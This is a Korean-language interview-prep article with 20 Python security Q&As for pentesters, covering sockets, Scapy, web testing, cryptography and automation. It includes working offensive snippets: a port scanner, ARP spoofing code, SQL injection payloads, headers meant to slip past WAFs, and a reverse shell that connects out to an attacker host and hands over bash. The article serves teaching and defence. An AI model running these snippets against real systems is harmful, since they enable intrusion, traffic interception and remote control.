---
title: "사이버 보안을 위한 Python: 펜테스터를 위한 인터뷰 Q&A"
description: "침투 테스트 및 InfoSec 역할을 위한 20가지 Python 보안 면접 질문. 소켓 프로그래밍, Scapy, 웹 익스플로잇, 암호화 및 자동화 스크립팅을 다룹니다."
date: 2026-02-11
tags: ["python", "interview", "security", "penetration-testing"]
keywords: ["python security interview", "infosec python questions", "scripting for hackers", "python pentest interview", "socket programming interview", "scapy interview questions", "python cryptography", "ethical hacking python", "security automation interview", "python exploit development"]
draft: false
schema_json: >
  {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "name": "사이버 보안을 위한 Python: 펜테스터를 위한 인터뷰 Q&A",
    "description": "소켓 프로그래밍, 패킷 조작, 웹 익스플로잇, 자동화를 다루는 20가지 Python 보안 면접 질문.",
    "proficiencyLevel": "Advanced",
    "inLanguage": "ko"
  }
---

## 시스템 초기화

Python은 공격적 및 방어적 보안에서 지배적인 언어입니다. 침투 테스트, 레드 팀, SOC 분석가, 보안 엔지니어링 역할 모두 자동화, 도구 개발, 빠른 프로토타이핑을 위한 Python 숙련도를 요구합니다. 면접관은 현장에서 코드를 작성할 것을 기대합니다 — TCP 소켓 클라이언트부터 패킷 크래프터, 웹 익스플로잇 스크립트까지. 이 가이드는 Python 프로그래밍과 보안 지식의 교차점을 테스트하는 20가지 질문을 다룹니다.

**코드 스니펫이 필요하신가요?** 준비하는 동안 [Python 보안 스크립팅 치트시트](/cheatsheets/python-security-scripts/)를 열어두세요.

---

## 네트워킹 및 소켓

<details>
<summary><strong>1. Python에서 TCP 클라이언트를 어떻게 생성합니까?</strong></summary>
<br>

```python
import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("target.com", 80))
client.send(b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n")
response = client.recv(4096)
print(response.decode())
client.close()
```

핵심 포인트: `AF_INET` = IPv4, `SOCK_STREAM` = TCP. UDP의 경우 `connect()`/`send()`/`recv()` 대신 `SOCK_DGRAM`과 `sendto()`/`recvfrom()`을 사용합니다. 프로덕션 스크립트에서는 항상 타임아웃을 설정하세요: `client.settimeout(5)`.
</details>

<details>
<summary><strong>2. 소켓 수준에서 TCP 3-way 핸드셰이크는 어떻게 작동합니까?</strong></summary>
<br>

`client.connect((host, port))`를 호출하면 Python의 소켓 라이브러리가 OS에 3-way 핸드셰이크 수행을 트리거합니다:

1. OS가 서버에 **SYN** 패킷을 전송합니다.
2. 서버가 **SYN-ACK**로 응답합니다.
3. OS가 **ACK**를 전송합니다 — 연결 설정 완료, `connect()`가 반환됩니다.

핸드셰이크가 실패하면(포트 닫힘, 타임아웃), `connect()`는 `ConnectionRefusedError` 또는 `socket.timeout`을 발생시킵니다. Scapy를 사용하면 각 패킷을 수동으로 생성하고 전송하여 스텔스 SYN 스캔을 수행할 수 있습니다 — SYN을 보내고, SYN-ACK를 확인한 후, 핸드셰이크 완료를 피하기 위해 ACK 대신 RST를 보냅니다.
</details>

<details>
<summary><strong>3. Python으로 멀티스레드 포트 스캐너를 작성하세요.</strong></summary>
<br>

```python
import socket
import threading
from queue import Queue

target = "192.168.1.1"
open_ports = []
lock = threading.Lock()
queue = Queue()

def scan(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((target, port))
        s.close()
        if result == 0:
            with lock:
                open_ports.append(port)
    except Exception:
        pass

def worker():
    while not queue.empty():
        scan(queue.get())
        queue.task_done()

for p in range(1, 1025):
    queue.put(p)

for _ in range(100):
    t = threading.Thread(target=worker, daemon=True)
    t.start()

queue.join()
print(f"Open ports: {sorted(open_ports)}")
```

토론 포인트: 왜 프로세스가 아닌 스레드인가(I/O 바운드이지 CPU 바운드가 아님), 왜 `connect` 대신 `connect_ex`인가(예외를 발생시키는 대신 오류 코드를 반환), 그리고 왜 `settimeout`이 중요한가(필터링된 포트에서의 행을 방지).
</details>

<details>
<summary><strong>4. `socket.connect()`와 `socket.connect_ex()`의 차이점은 무엇입니까?</strong></summary>
<br>

- `connect()`: 연결이 실패하면 예외(`ConnectionRefusedError`, `TimeoutError`)를 발생시킵니다. 실패 시 실행을 중단해야 하는 스크립트에 적합합니다.
- `connect_ex()`: 예외를 발생시키는 대신 오류 코드를 반환합니다. 성공 시 `0`, 실패 시 0이 아닌 errno를 반환합니다. try/except 오버헤드 없이 수백 개의 포트를 확인해야 하는 포트 스캐너에 더 적합합니다.
</details>

## Scapy 및 패킷 조작

<details>
<summary><strong>5. Scapy란 무엇이며 왜 raw 소켓보다 선호됩니까?</strong></summary>
<br>

Scapy는 인터랙티브 패킷 조작을 위한 Python 라이브러리입니다. 모든 프로토콜 레이어에서 네트워크 패킷을 위조, 전송, 캡처, 분석할 수 있습니다.

raw 소켓 대비 장점:
- **레이어별 구성**: 프로토콜 레이어를 쌓아 패킷 구축: `IP()/TCP()/Raw()`.
- **프로토콜 지원**: 수백 개의 프로토콜에 대한 내장 지원(ARP, DNS, ICMP, TCP, UDP, 802.11).
- **응답 파싱**: 요청과 응답을 자동으로 매칭하고 분석.
- **인터랙티브 모드**: 실시간 패킷 실험을 위한 REPL.

raw 소켓은 수동 바이트 수준 패킷 구성과 OS 수준 권한이 필요합니다. Scapy는 동일한 수준의 제어를 제공하면서 이를 추상화합니다.
</details>

<details>
<summary><strong>6. Scapy로 ARP 스푸핑을 어떻게 수행합니까?</strong></summary>
<br>

```python
from scapy.all import ARP, Ether, sendp

def arp_spoof(target_ip, spoof_ip, target_mac):
    packet = Ether(dst=target_mac) / ARP(
        op=2,  # ARP reply
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip  # Claim to be this IP
    )
    sendp(packet, verbose=0)
```

이것은 `spoof_ip`가 당신의 MAC 주소에 있다고 대상에게 알리는 비요청 ARP 응답을 보냅니다. `spoof_ip`로 향하는 트래픽이 당신의 머신으로 리디렉션됩니다. IP 포워딩과 결합하면 중간자 공격이 가능해집니다.

**방어**: 정적 ARP 항목, Dynamic ARP Inspection(DAI), 또는 arpwatch와 같은 ARP 모니터링 도구.
</details>

<details>
<summary><strong>7. 네트워크 트래픽을 스니핑하고 특정 프로토콜을 필터링하는 방법은?</strong></summary>
<br>

```python
from scapy.all import sniff, TCP, IP

def packet_handler(packet):
    if packet.haslayer(TCP) and packet.haslayer(IP):
        src = packet[IP].src
        dst = packet[IP].dst
        sport = packet[TCP].sport
        dport = packet[TCP].dport
        print(f"{src}:{sport} -> {dst}:{dport}")

# Capture HTTP traffic only
sniff(filter="tcp port 80", prn=packet_handler, count=50, store=0)
```

`filter` 매개변수는 BPF(Berkeley Packet Filter) 구문을 사용합니다. `store=0`은 메모리에 패킷을 저장하는 것을 방지합니다. root/admin 권한이 필요합니다.
</details>

## 웹 보안

<details>
<summary><strong>8. 보안 테스트를 위해 웹 요청을 어떻게 자동화합니까?</strong></summary>
<br>

```python
import requests

session = requests.Session()

# Custom headers to bypass basic WAFs
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "X-Forwarded-For": "127.0.0.1"
})

# Login and maintain session cookies
login_data = {"username": "admin", "password": "test"}
session.post("http://target.com/login", data=login_data)

# Authenticated request (cookies auto-included)
response = session.get("http://target.com/admin/dashboard")
print(response.status_code)
```

핵심 개념: `Session()`은 요청 간에 쿠키를 유지합니다. 프로덕션 스크립트에서는 항상 `timeout`을 설정하세요. `verify=False`는 통제된 테스트 환경에서만 사용하세요(SSL 검증을 비활성화함).
</details>

<details>
<summary><strong>9. Python을 사용하여 SQL 인젝션을 어떻게 테스트하겠습니까?</strong></summary>
<br>

```python
import requests

url = "http://target.com/search"
payloads = [
    "' OR 1=1--",
    "' UNION SELECT NULL,NULL--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND 1=CONVERT(int,@@version)--"
]

for payload in payloads:
    r = requests.get(url, params={"q": payload}, timeout=10)
    if "error" in r.text.lower() or "sql" in r.text.lower():
        print(f"[!] Possible SQLi with: {payload}")
    if r.elapsed.seconds >= 5:
        print(f"[!] Time-based SQLi confirmed: {payload}")
```

이것은 오류 기반(응답의 오류 메시지), 유니온 기반(변경된 출력), 시간 기반 블라인드(지연된 응답) SQL 인젝션을 테스트합니다. 프로덕션 펜테스트에는 SQLMap을 사용하지만, 면접관은 기본 메커니즘에 대한 이해를 기대합니다.
</details>

<details>
<summary><strong>10. requests.get()과 urllib의 차이점은 무엇입니까?</strong></summary>
<br>

- **requests**: 서드파티 라이브러리. 깔끔한 API, 자동 JSON 파싱, 세션 관리, 커넥션 풀링, 프록시 지원. Python HTTP의 산업 표준.
- **urllib**: 표준 라이브러리. 더 장황하고 저수준. 세션 관리 없음. 서드파티 패키지를 설치할 수 없는 경우에 유용(제한된 환경, 람다 함수).

보안 테스트에는 그 간편함 때문에 `requests`가 선호됩니다. 의존성 최소화가 중요한 익스플로잇 개발에서는 `urllib`이나 raw 소켓이 더 나을 수 있습니다.
</details>

## 암호화

<details>
<summary><strong>11. 해싱과 암호화의 차이점은 무엇입니까?</strong></summary>
<br>

- **해싱**: 단방향 함수. 입력 → 고정 크기 다이제스트. 되돌릴 수 없음. 같은 입력은 항상 같은 출력을 생성. 무결성 검증, 비밀번호 저장에 사용. 예: SHA-256, bcrypt, Argon2.
- **암호화**: 양방향 함수. 평문 → 암호문(키 사용) → 평문(키 사용). 키 소유자에 의해 되돌릴 수 있도록 설계됨. 기밀성에 사용. 예: AES, RSA, ChaCha20.

흔한 실수: MD5/SHA를 사용하여 데이터를 "암호화"하는 것. 해싱은 암호화가 아닙니다 — 해시에서 원본 데이터를 복구할 수 없습니다(무차별 대입 없이는).
</details>

<details>
<summary><strong>12. Python에서 AES 암호화를 어떻게 구현합니까?</strong></summary>
<br>

```python
from cryptography.fernet import Fernet

# Generate a key (store securely!)
key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt
plaintext = b"sensitive data"
ciphertext = cipher.encrypt(plaintext)

# Decrypt
decrypted = cipher.decrypt(ciphertext)
assert decrypted == plaintext
```

Fernet은 인증된 암호화를 위해 HMAC-SHA256과 함께 AES-128-CBC를 사용합니다. 더 낮은 수준의 제어를 위해서는 `cryptography.hazmat`에서 AES-GCM을 사용하세요(인증된 암호화, 별도의 HMAC 불필요).

자체 암호화 프리미티브를 구현하지 마세요. 검증된 라이브러리를 사용하세요.
</details>

<details>
<summary><strong>13. Python에서 비밀번호를 안전하게 해싱하는 방법은?</strong></summary>
<br>

```python
import bcrypt

# Hash a password
password = b"user_password"
salt = bcrypt.gensalt(rounds=12)
hashed = bcrypt.hashpw(password, salt)

# Verify a password
if bcrypt.checkpw(password, hashed):
    print("Password matches")
```

왜 SHA-256 대신 bcrypt인가: bcrypt는 의도적으로 **느리게** 설계되어(설정 가능한 라운드) 무차별 대입 공격을 비실용적으로 만듭니다. SHA-256은 빠르게 설계되어 공격자가 GPU로 초당 수십억 번 계산할 수 있습니다. 대안: Argon2(메모리 하드, 새 프로젝트에 권장), PBKDF2(널리 지원됨).
</details>

## 자동화 및 스크립팅

<details>
<summary><strong>14. Python에서 서브프로세스 실행을 안전하게 처리하는 방법은?</strong></summary>
<br>

```python
import subprocess

# SECURE: Pass arguments as a list (no shell injection)
result = subprocess.run(
    ["nmap", "-sV", "-p", "80,443", "192.168.1.1"],
    capture_output=True, text=True, timeout=60
)
print(result.stdout)

# INSECURE: Never do this with user input
# subprocess.run(f"nmap {user_input}", shell=True)  # Command injection!
```

규칙: 사용자 제어 입력으로 `shell=True`를 절대 사용하지 마세요. 항상 명령을 리스트로 전달하세요. 행을 방지하기 위해 `timeout`을 설정하세요. stdout/stderr를 수집하기 위해 `capture_output=True`를 사용하세요.
</details>

<details>
<summary><strong>15. Python으로 로그 파일을 어떻게 파싱하고 분석합니까?</strong></summary>
<br>

```python
import re
from collections import Counter

failed_logins = Counter()

with open("/var/log/auth.log") as f:
    for line in f:
        match = re.search(r"Failed password .* from (\d+\.\d+\.\d+\.\d+)", line)
        if match:
            failed_logins[match.group(1)] += 1

# Top 10 offending IPs
for ip, count in failed_logins.most_common(10):
    print(f"{ip}: {count} failed attempts")
```

큰 파일의 경우 항상 줄 단위로 읽으세요(전체 파일을 `.read()`로 메모리에 로드하지 마세요). 성능을 위해 `re.compile()`로 정규식 패턴을 미리 컴파일하세요.
</details>

<details>
<summary><strong>16. GIL이란 무엇이며 보안 도구에 어떤 영향을 미칩니까?</strong></summary>
<br>

**Global Interpreter Lock(GIL)** 은 여러 스레드가 동시에 Python 바이트코드를 실행하는 것을 방지합니다. CPython에서는 한 번에 하나의 스레드만 실행됩니다.

보안 도구에 대한 영향:
- **포트 스캐너**(I/O 바운드): 스레딩이 잘 작동합니다. 스레드는 Python 코드 실행이 아닌 네트워크 응답 대기에 대부분의 시간을 보냅니다. GIL은 I/O 작업 중에 해제됩니다.
- **비밀번호 크래커**(CPU 바운드): 스레딩은 무용합니다. 여러 CPU 코어를 활용하려면 `multiprocessing`을 사용하거나, 실제 크래킹에는 C 확장(hashcat, John the Ripper)을 사용하세요.
- **대안**: 고동시성 네트워크 도구에는 `asyncio`를 사용하세요(최소한의 오버헤드로 수천 개의 동시 연결).
</details>

## 익스플로잇 개발

<details>
<summary><strong>17. Python에서 리버스 쉘 페이로드를 어떻게 만듭니까?</strong></summary>
<br>

```python
import socket, subprocess, os

def reverse_shell(attacker_ip, attacker_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, attacker_port))
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr
    subprocess.call(["/bin/bash", "-i"])
```

이것은 stdin/stdout/stderr을 TCP 소켓으로 리디렉션하여 공격자에게 인터랙티브 쉘을 제공합니다. 면접에서는 코드뿐만 아니라 개념과 방어(이그레스 필터링, 네트워크 세그먼테이션, EDR 모니터링)를 설명하세요. 이것은 인가된 테스트와 CTF 챌린지만을 위한 것입니다.
</details>

<details>
<summary><strong>18. 직렬화란 무엇이며 왜 보안 위험입니까?</strong></summary>
<br>

직렬화는 객체를 바이트로 변환하여 저장/전송합니다. 신뢰할 수 없는 데이터의 **역직렬화**는 치명적인 취약점입니다.

```python
import pickle

# DANGEROUS: Never unpickle untrusted data
data = pickle.loads(untrusted_bytes)  # Can execute arbitrary code!
```

Python의 `pickle`은 역직렬화 중에 임의의 코드를 실행할 수 있습니다. 공격자는 로드 시 리버스 쉘을 생성하는 pickle 페이로드를 만들 수 있습니다.

안전한 대안: 데이터 교환에는 `json`을 사용하세요(코드 실행 불가). 복잡한 객체를 역직렬화해야 하는 경우 `jsonschema` 유효성 검사 또는 엄격한 스키마가 있는 protobuf/msgpack을 사용하세요.
</details>

<details>
<summary><strong>19. OSINT 수집을 위해 REST API와 어떻게 상호작용합니까?</strong></summary>
<br>

```python
import requests

# Shodan API - find exposed services
api_key = "YOUR_API_KEY"
target = "8.8.8.8"
response = requests.get(
    f"https://api.shodan.io/shodan/host/{target}",
    params={"key": api_key}
)
data = response.json()

for service in data.get("data", []):
    print(f"Port {service['port']}: {service.get('product', 'unknown')}")
```

일반적인 OSINT API: Shodan(노출된 장치), VirusTotal(멀웨어 분석), Have I Been Pwned(유출 데이터), SecurityTrails(DNS 이력). 항상 속도 제한과 서비스 약관을 준수하세요.
</details>

<details>
<summary><strong>20. Python 키로거를 어떻게 작성하며 어떻게 탐지합니까?</strong></summary>
<br>

개념적 답변(면접 맥락):
키로거는 OS 입력 시스템에 후킹하여 키 입력을 캡처합니다. Linux에서는 `/dev/input/event*` 장치에서 읽습니다. Windows에서는 `ctypes` 또는 `pynput`을 통해 `SetWindowsHookEx` API를 사용합니다.

**탐지 방법**:
- 입력 장치에 접근하는 프로세스 모니터링: `lsof /dev/input/*`.
- 실행 중인 Python 프로세스에서 예기치 않은 `pynput`, `keyboard` 또는 `ctypes` 임포트 확인.
- 알려진 키로거 패턴에 대한 EDR/안티바이러스 시그니처.
- 유출을 위한 네트워크 모니터링(키로거는 데이터를 어딘가로 보내야 함).

면접에서는 항상 방어적 관점을 강조하세요: 키로거를 탐지, 예방, 대응하는 방법 — 구축하는 방법만이 아닙니다.
</details>
